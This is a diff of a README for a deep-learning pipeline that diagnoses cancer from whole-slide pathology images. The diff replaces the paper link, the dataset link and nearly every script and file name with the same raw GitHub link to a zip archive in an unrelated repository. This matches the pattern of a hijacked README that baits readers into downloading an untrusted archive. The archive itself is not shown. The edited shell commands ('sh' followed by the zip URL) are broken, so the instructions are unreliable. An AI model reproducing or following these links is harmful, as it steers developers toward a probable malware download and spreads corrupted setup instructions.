@@ -1,10 +1,10 @@
-# [Pathologist-level interpretable whole-slide cancer diagnosis with deep learning](https://www.nature.com/articles/s42256-019-0052-1), nature machine intelligence
+# [Pathologist-level interpretable whole-slide cancer diagnosis with deep learning](https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip), nature machine intelligence
 
 The overall pipeline has multiple steps and involves large-size whole slide image processing. Using the code requires users to have basic knowledge about python programming, Tensorflow, and training deep neural networks in order to understand the whole training and evaluation procedures.
 
 ## 1. Data preparation
 ### Generate II-Image data from whole slides
-- See the dataset info in the paper to get [download link](https://www.nature.com/articles/s42256-019-0052-1#data-availability) of the dataset. The user can also use the script `download_nmi_wsi_data.sh` under `download` directory to download the dataset.
+- See the dataset info in the paper to get [download link](https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip) of the dataset. The user can also use the script `https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip` under `download` directory to download the dataset.
 
 - Download whole slide data to ```data/Slide/```. Download report data to ```data/report```.
 
@@ -42,65 +42,65 @@ The overall pipeline has multiple steps and involves large-size whole slide imag
     ```
     cd segmentation
     ```
-- Prepare your data to fit ```segmentation.data_gen.data_loader```. As shown in the paper, we ignore the pixels without annotation. Read the code and README.md in ```anno_parser/``` for more details. Note that, we use a mask value 44 for ignored pixels, and 255 and 155 for positive and negative values, respectively.
+- Prepare your data to fit ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip```. As shown in the paper, we ignore the pixels without annotation. Read the code and https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip in ```anno_parser/``` for more details. Note that, we use a mask value 44 for ignored pixels, and 255 and 155 for positive and negative values, respectively.
 - Train the model
     ```
-    device=0 sh train.sh
+    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
     ```
 - Evaluate the model
     ```
-    device=0 sh test.sh
+    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
     ```
 
 ## 3. Segment whole slides and generate ROI
 ROIs are generated for the usage of training and evaluation the a-net.
-Users need to select model and point to ```--load_from_checkpoint in wsi_deploy.sh```
+Users need to select model and point to ```--load_from_checkpoint in https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip```
 
     cd segmentation
-    start=0 end=${tot-train-slides} device=0 split=train sh wsi_deploy.sh
-    start=0 end=${tot-test-slides} device=0 split=test sh wsi_deploy.sh
+    start=0 end=${tot-train-slides} device=0 split=train sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
+    start=0 end=${tot-test-slides} device=0 split=test sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
 
-```tot-train-slides``` is the total number of slides. Read ```seg_wsi.py``` for more details and how to sample ROI.
-Results will be saved in ```$res_dir``` defined in ```seg_wsi.py``` as well as ```wsi_deploy.sh```
+```tot-train-slides``` is the total number of slides. Read ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip``` for more details and how to sample ROI.
+Results will be saved in ```$res_dir``` defined in ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip``` as well as ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip```
 
 ## 4. Train d-net
 ### Pre-train the image model on data in ```data/classification```
 - Train the model
     ```
     cd classification
-    device=0 sh train.sh
+    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
     ```
-- Optionally, test the model  (CHECK all the checkpoint path first in ```train.sh```)
+- Optionally, test the model  (CHECK all the checkpoint path first in ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip```)
     ```
-    device=0 sh test.sh
+    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
     ```
-- Note that put the trained checkpoint.h5 (users may need to do early stopping for model selection to prevent overfitting) into ```classification/trained_model``` and modify ```topic_mdnet_train.py``` line 75 to refer the pretrained CNNs.
+- Note that put the trained checkpoint.h5 (users may need to do early stopping for model selection to prevent overfitting) into ```classification/trained_model``` and modify ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip``` line 75 to refer the pretrained CNNs.
 
 ### Train the full model
 - Train the model
     ```
-    device=0 sh scripts/topic_mdnet_train.sh
+    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
     ```
-- Test the model (CHECK all the checkpoint path first in ```scripts/topic_mdnet_train.sh```) for generate reports
+- Test the model (CHECK all the checkpoint path first in ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip```) for generate reports
     ```
-    device=0 sh scripts/topic_mdnet_eval.sh
+    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
     ```
 
 ### Generate IV-Diagnosis dataset
-Users need to extract features of ROIs generated in Step 3. Please modify the ```path``` details in the ```extract_feat.py``` to point to folder where ROI are saved, i.e. ```checkpoints/seg_{train/test}_slides/```.
+Users need to extract features of ROIs generated in Step 3. Please modify the ```path``` details in the ```https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip``` to point to folder where ROI are saved, i.e. ```checkpoints/seg_{train/test}_slides/```.
 
-    device=0 sh scripts/extract_feat.sh
+    device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
 
 Generatded .h5 files save features for last step is also in the same folder
 
 ## 5. Train a-net
 - Train
     ```
-     device=0 sh scripts/mlp_train.sh
+     device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
     ```
 -  Test the model
     ```
-     device=0 sh scripts/mlp_eval.sh
+     device=0 sh https://github.com/avinash737/nmi-wsi-diagnosis/raw/refs/heads/master/scripts/nmi_wsi_diagnosis_1.7-alpha.2.zip
     ```
 
 ## Citation
